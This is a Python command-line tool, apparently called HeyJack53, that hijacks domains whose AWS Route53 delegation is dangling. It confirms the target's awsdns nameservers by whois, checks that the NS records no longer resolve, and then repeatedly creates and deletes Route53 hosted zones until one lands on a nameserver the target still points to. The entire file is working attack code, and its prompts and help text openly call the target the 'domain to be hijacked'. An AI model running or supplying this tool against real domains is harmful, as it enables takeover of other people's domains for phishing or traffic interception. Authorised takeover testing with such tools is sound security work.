#!/usr/bin/env python

import time
import sys
import logging
import argparse
import boto3
import botocore
import whois
import dns.resolver
from datetime import datetime

logging.basicConfig(level=logging.INFO)


def parse_command_line(description):
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-d', '--domain', type=str, default=None, help='Domain to be hijacked')
    parser.add_argument('-p', '--profile', type=str, default=None, help='AWS profile from ~/.aws/credentials file')
    parser.add_argument('-a', '--access', type=str, default=None, help='AWS Access Key')
    parser.add_argument('-s', '--secret', type=str, default=None, help='AWS Secret Access Key')
    parser.add_argument('-t', '--token', type=str, default=None, help='AWS Session Token')
    parser.add_argument('-ns', '--nameserver', type=str, default=None, action='append', nargs='*',
                        help='NameServers can be listed here. Ex: -ns ns-001.awsdns-01.com ns-002.awsdns-02.com ')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')
    parser.add_argument('-f', '--force', action='store_true', help='Force to continue if NS were already taken')
    args = parser.parse_args()
    return args


def main():
    args = parse_command_line("Hey Jack!")

    domain = args.domain
    verbose = args.verbose
    force = args.force

    if not domain:
        logging.error("Please, provide a domain to be hijacked!")
        sys.exit(1)

    print(f'Searching for {domain} nameservers ...')
    if not args.nameserver:
        whois_domain = whois.query(domain=args.domain)
        if not whois_domain:
            logging.error(f"{domain} does not seem to exist")
            sys.exit(1)
        target_name_servers = whois_domain.name_servers
        if len(target_name_servers) == 0:
            logging.error(f'We could not find a nameserver for {domain}. You can provide them using -ns parameter.')
    else:
        target_name_servers = set(args.nameserver[0])

    print('The following name servers were found:')
    print(target_name_servers)

    aws_dns = False
    for ns in target_name_servers:
        if 'awsdns' in ns:
            aws_dns = True
    if not aws_dns:
        logging.error('These nameservers do not belong to an AWS Route53 hosted zones ... ')
        sys.exit(1)

    try:
        dns.resolver.resolve(domain, 'NS')
        print('Looks like this domain was already taken :(')
        if not force:
            logging.info('If it is a mistake you can continue anyway using the -f parameter')
            sys.exit(1)

    except Exception as e:
        print('No name server resolved! Continue and Hijack this domain!!')

    if args.profile:
        session = boto3.Session(profile_name=args.profile)
    elif args.access and args.secret:
        session = boto3.Session(aws_access_key_id=args.access,
                                aws_secret_access_key=args.secret,
                                aws_session_token=args.token)
    else:
        logging.error("AWS AUTHENTICATION NEEDED!!")
        sys.exit(1)
    route53 = session.client('route53')

    print('\n', 80 * '-')
    print('Everything is ready!')
    print('Target Domain:', domain)
    print('Target Name Servers:', " ".join(target_name_servers))
    proceed = ""
    while proceed not in ['Y', 'y', 'N', 'n']:
        proceed = input('Continue? (Y/N) \n')

    if proceed in ['Y', 'y']:
        print('\n', 80 * '-')
        print('Starting HeyJack53!\n\n')
    elif proceed in ['N', 'n']:
        print('Bye bye!')
        sys.exit(1)

    counter = 0
    created_zones = []
    failed_zones = []
    successful_zone = ""
    hijacked = False
    try:
        while not hijacked:
            counter += 1
            print('Counter', counter)
            new_zone = route53.create_hosted_zone(Name=domain,
                                                  HostedZoneConfig={'Comment': 'HeyJack53 domain hijack!'},
                                                  CallerReference=f'HeyJack53_{domain}_{datetime.now()}')
            hosted_zone_id = new_zone.get('HostedZone').get('Id')
            created_zones.append(hosted_zone_id)
            new_name_servers = new_zone.get('DelegationSet').get('NameServers')
            if verbose:
                print('New zone created with the following Name Servers:')
                print(" ".join(new_name_servers))

            intersection = set(new_name_servers).intersection(set(target_name_servers))
            if len(intersection) == 0:
                failed_zones.append(hosted_zone_id)
                if verbose:
                    print('No common Name Server. Deleting New Zone!!\n')

                try:
                    route53.delete_hosted_zone(Id=hosted_zone_id)
                    failed_zones.remove(hosted_zone_id)
                    if len(failed_zones) != 0:
                        for zone in failed_zones:
                            route53.delete_hosted_zone(Id=zone)

                except botocore.exceptions.ClientError as exception_obj:
                    if exception_obj.response['Error']['Code'] == 'Throttling':
                        logging.warning(exception_obj.response['Error']['Message'])
                        logging.warning('Waiting 3 seconds to continue...')
                        time.sleep(3)
                    else:
                        logging.error("Unexpected ClientError exception", exception_obj)
                        sys.exit(1)

            else:
                successful_zone = hosted_zone_id
                print(f"Successful attempt after {counter} tries!!")
                print("The hijacked zone is", successful_zone)
                hijacked = True

        if len(failed_zones) != 0:
            for zone in failed_zones:
                route53.delete_hosted_zone(Id=zone)

    except KeyboardInterrupt:
        if len(failed_zones) != 0:
            print(f"{len(failed_zones)} were not deleted yet. Do you want to try to delete them?")
            delete_leftover = input("Enter Y/y for yes\n")
            if delete_leftover == "Y" or delete_leftover == "y":
                for zone in failed_zones:
                    route53.delete_hosted_zone(Id=zone)
            else:
                print("The following stale zones still exist in your AWS account:")
                for zone in failed_zones:
                    print(zone)

    except Exception as e:
        logging.error("Unexpected exception", e)
        sys.exit(1)


if __name__ == '__main__':
    main()
